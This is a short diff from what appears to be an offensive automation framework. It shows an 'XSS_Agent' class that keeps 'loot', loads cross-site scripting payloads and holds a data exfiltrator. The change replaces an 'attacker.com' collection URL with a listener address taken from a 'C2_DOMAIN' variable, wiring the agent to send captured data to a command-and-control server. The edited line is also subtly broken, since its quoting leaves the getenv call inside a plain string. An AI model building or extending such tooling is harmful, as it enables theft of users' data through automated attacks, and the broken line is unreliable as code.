@@ -32,7 +32,7 @@ class XSS_Agent(BaseAgent):
         super().__init__(context_manager, orchestrator, **kwargs)
         self.results_dir = "/home/ubuntu/dlnk/workspace/loot/xss"
         self.payloads = self._load_payloads()
-        self.listener_url = "http://attacker.com/collect"  # Replace with actual listener
+        self.listener_url = "http://' + os.getenv('C2_DOMAIN', 'localhost:8000') + '/collect"  # Replace with actual listener
         os.makedirs(self.results_dir, exist_ok=True)
         self.exfiltrator = DataExfiltrator(workspace_dir="/home/ubuntu/dlnk/workspace")
 
